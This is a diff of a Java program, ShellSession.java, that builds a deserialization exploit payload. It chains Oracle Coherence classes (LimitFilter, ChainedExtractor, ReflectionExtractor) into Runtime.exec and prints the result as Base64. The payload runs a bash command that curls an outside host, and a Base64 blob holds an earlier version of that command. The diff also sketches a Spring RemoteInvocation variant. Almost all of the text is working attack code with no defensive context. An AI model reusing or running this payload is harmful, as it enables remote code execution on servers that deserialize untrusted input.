@@ -1,5 +1,5 @@
 //
-// javac ShellSession.java -cp JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar
+// javac -cp JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar ShellSession.java 
 // java -cp JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar:. ShellSession
 //
 
@@ -70,38 +70,47 @@ public class ShellSession implements Serializable {
 
 
     public static void main(String[] args) throws Exception {
-        String[] command = {"/bin/bash", "-c", "curl www.sapo.shk0x.net"};
-
-        //ShellSession session = new ShellSession(command);
-
-        //byte[] serializedData = serialize(session);
-        //String base64String = Base64.getEncoder().encodeToString(serializedData);
-        //System.out.println("Objeto serializado en Base64: " + base64String);
-
-        //System.out.println("Deserializando el objeto desde Base64...");
-        //String otro = "rO0ABXNyAAxTaGVsbFNlc3Npb24AAAAAAAAAAQIAAVsAB2NvbW1hbmR0ABNbTGphdmEvbGFuZy9TdHJpbmc7eHB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAADdAAJL2Jpbi9iYXNodAACLWN0ABdjdXJsIHd3dy5zYXBvLnNoazB4Lm5ldA==";
+        String[] command = {"/bin/bash", "-c", "curl rcex.sapo.shk0x.net"};
+        ShellSession session = new ShellSession(command);
 
 
 
+        /* 
+        *   gadget:
+        *      BadAttributeValueExpException.readObject()
+        *          com.tangosol.util.filter.LimitFilter.toString()
+        *              com.tangosol.util.extractor.ChainedExtractor.extract()
+        *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
+        *                      Method.invoke()
+        *                      ...
+        *                      Runtime.getRuntime.exec()
+        */
 
-/* gadget:
- *      BadAttributeValueExpException.readObject()
- *          com.tangosol.util.filter.LimitFilter.toString()
- *              com.tangosol.util.extractor.ChainedExtractor.extract()
- *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
- *                      Method.invoke()
- *                      ...
- *                      Runtime.getRuntime.exec()
- */
+        // ReflectionExtractor.extract() 
+        //   -> RemoteInvocation.invoke() 
+        //     -> RemoteInvocation.invoke()
+        //
+        //
+        //  org.springframework.remoting.support.RemoteInvocation.invoke()
+        //  RemoteInvocation(java.lang.String methodName, java.lang.Class<?>[] parameterTypes, java.lang.Object[] arguments)
+        //
+        //
+
 
         // Runtime.class.getRuntime()
         ReflectionExtractor extractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
-
+        
+        // RemoteInvocation.invoke()
+        //ReflectionExtractor extractor1 = new ReflectionExtractor("getMethod", new Object[]{"invoke", new Class[0]});
+        
+        
         // get invoke() to execute exec()
         ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});
 
+
         // invoke("exec","curlazo")
         ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{command});
+        //ReflectionExtractor extractor2 = new ReflectionExtractor("exec", new Object[]{command});
 
         ReflectionExtractor[] extractors = {
                 extractor1,
@@ -140,7 +149,7 @@ public class ShellSession implements Serializable {
         String base64String = Base64.getEncoder().encodeToString(payload);
         System.out.println("Objeto serializado en Base64: " + base64String);
 
-        System.out.println("Deserializando el objeto desde Base64...");
+        //System.out.println("Deserializando el objeto desde Base64...");
         //String otro = "rO0ABXNyAAxTaGVsbFNlc3Npb24AAAAAAAAAAQIAAVsAB2NvbW1hbmR0ABNbTGphdmEvbGFuZy9TdHJpbmc7eHB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAADdAAJL2Jpbi9iYXNodAACLWN0ABdjdXJsIHd3dy5zYXBvLnNoazB4Lm5ldA==";
 
 
